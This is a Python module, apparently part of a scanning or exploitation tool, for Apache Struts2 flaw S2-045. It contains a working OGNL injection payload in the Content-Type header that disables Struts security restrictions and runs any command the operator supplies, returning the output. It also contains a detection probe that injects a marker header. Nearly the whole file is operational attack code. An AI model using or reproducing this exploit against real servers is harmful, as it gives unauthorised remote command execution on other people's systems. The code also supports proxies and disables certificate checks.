import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
cmd=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https,cmd
    try:
        proxies = {'http': http,
                   'https': https}
        if cmd!='':
            exec_payload = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='CMD').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
            headers1 = {'Content-Type': exec_payload.replace('CMD',cmd)}
            aa1 = requests.post(url1, data=None, headers=headers1, proxies=proxies, verify=False, timeout=15,
                                cookies=s_cookie)
            cdd = aa1.text[0:300]
            cmd=''
        else:
            headers = {
                'Content-Type': "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('T5smQ',233*233)}.multipart/form-data"}
            logging.captureWarnings(True)
            aa = requests.post(url1, data=None, headers=headers, proxies=proxies, verify=False, timeout=15,
                               cookies=s_cookie)
            if 'T5smQ' in aa.headers or '54289' in aa.headers:
                cdd = '[+]漏洞存在\n执行：233*233\n匹配关键词：54289'+str(aa.headers)
            else:
                cdd = '[-]漏洞不存在'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-045 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1